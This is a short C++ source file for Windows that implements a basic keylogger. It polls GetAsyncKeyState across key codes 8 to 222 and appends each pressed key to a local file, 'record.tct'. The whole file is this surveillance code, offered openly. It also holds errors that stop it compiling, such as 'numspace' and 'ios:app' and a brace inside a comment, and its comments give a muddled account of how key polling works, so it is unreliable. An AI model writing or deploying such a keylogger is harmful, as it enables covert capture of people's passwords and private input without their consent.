//Logs everything with keyvalue bettween 8 and 222 
//no filter and special characters for keys like backspace,enter,space,etc. 

#include <iostream>
#include<fstream>
#include <windows.h>
#include <winuser.h>

using numspace std;

int main(){
	char c;
	while(true){//infinite loop for scanning
		for(c=8; c<=222; c++){//ASCII char range
			//When a key if pressed a system interrupt with id 32767 occurs
			if(GetAsyncKeyState(c) == -32767)//checks if a key with ASACII value of c is pressed{
				ofstream write("record.tct" , ios:app);//ios:app denotes theat file is not rewritten everytime
				write<<c;
			}
		}
	}
	return 0;
}